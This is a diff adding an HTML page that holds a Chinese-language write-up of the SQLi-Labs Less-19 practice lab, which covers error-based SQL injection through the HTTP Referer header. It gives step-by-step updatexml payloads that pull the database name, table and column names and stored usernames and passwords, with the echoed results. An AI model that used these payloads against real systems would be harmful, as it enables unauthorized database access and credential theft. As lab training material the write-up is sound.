@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-19 头部注入（Referer）Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-19 头部注入（Referer）Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.25 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, POST注入, Header注入, 报错注入</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-19 (POST - Header Injection - Referer field - Error based)</li>
+        <li><strong>提示：</strong>POST请求，HTTP头部注入（Referer字段），基于报错</li>
+    </ul>
+
+    <h2>2. 解题思路与前置原理</h2>
+    <p>本关卡的业务逻辑与 Less-18 完全一致：必须先使用正确的账号密码登录成功，后台才会执行记录用户信息的 <code>INSERT</code> 语句。</p>
+    <p>与 L18 的区别在于，后台记录的数据字段从 <code>User-Agent</code> 变为了 <code>Referer</code>（来源页）。由于代码未对 <code>Referer</code> 进行过滤，导致此处存在报错注入漏洞。</p>
+    <p><strong>核心技巧：</strong>在 HTTP 请求头中，行尾的注释符 <code>#</code> 或 <code>--+</code> 容易因为空格丢失或被吞掉而失效。因此，需采用 <code>' or 表达式 or '</code> 的方式，首尾闭合，将 Payload 完美嵌入原 SQL 语句中。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>前提条件：</strong>使用有效的账号密码（如 admin/123456）登录，页面显示 <code>SUCCESSFULLY LOGGED IN</code>。</p>
+
+    <p><strong>第一步：抓包与定位注入点</strong></p>
+    <p>使用 Burp Suite 拦截登录请求，发送至 Repeater。定位到请求头中的 <code>Referer</code> 字段（第 18 行）。</p>
+
+    <p><strong>第二步：利用 Referer 进行报错注入</strong></p>
+    <p>依次替换 <code>Referer</code> 的值为以下 Payload：</p>
+    
+    <p><strong>1. 确认注入与当前库名：</strong></p>
+    <pre><code>Referer: ' or updatexml(1,concat(0x7e,(select database()),0x7e),1) or '</code></pre>
+    <p><strong>回显：</strong><code>XPATH syntax error: '~security~'</code>。</p>
+
+    <p><strong>2. 获取表名：</strong></p>
+    <pre><code>Referer: ' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or '</code></pre>
+    <p><strong>回显：</strong><code>XPATH syntax error: '~emails,referrers,uagents,users~'</code>。</p>
+
+    <p><strong>3. 获取列名（使用十六进制规避单引号）：</strong></p>
+    <pre><code>Referer: ' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),0x7e),1) or '</code></pre>
+    <p><em>注：<code>0x7573657273</code> 为 <code>users</code> 的十六进制。在 Header 中嵌套单引号极易引发解析错误，使用十六进制是最佳实践。</em></p>
+    <p><strong>回显：</strong><code>XPATH syntax error: '~id,username,password~'</code>。</p>
+
+    <p><strong>4. 提取账号密码：</strong></p>
+    <pre><code>Referer: ' or updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1) or '</code></pre>
+    <p><em>注：受限于 32 字符报错长度限制，使用 <code>limit 0,1</code> 提取第一行数据。</em></p>
+    <p><strong>回显：</strong><code>XPATH syntax error: '~Dumb:Dumb~'</code>。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>前置登录要求：</strong>Header 注入的前提是代码执行到了 <code>INSERT</code> 语句，如果登录失败，后台直接 <code>exit()</code>，注入点根本不会触发。</li>
+        <li><strong>Header 中的引号处理：</strong>在 <code>Referer</code> 或 <code>User-Agent</code> 中，尽量少用单引号去包裹字符串（如 <code>table_name='users'</code>），改用十六进制 <code>0x...</code> 能有效避免语法破坏。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>Referer 注入：</strong>HTTP 头部的各类字段（UA、Referer、X-Forwarded-For、Cookie 等）只要被后端接收并拼接入数据库，都可能成为注入点。</li>
+        <li><strong>无注释符闭合：</strong>掌握 <code>' or ... or '</code> 这种“对称闭合”手法，能在无法使用注释符的严苛环境中完成注入。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
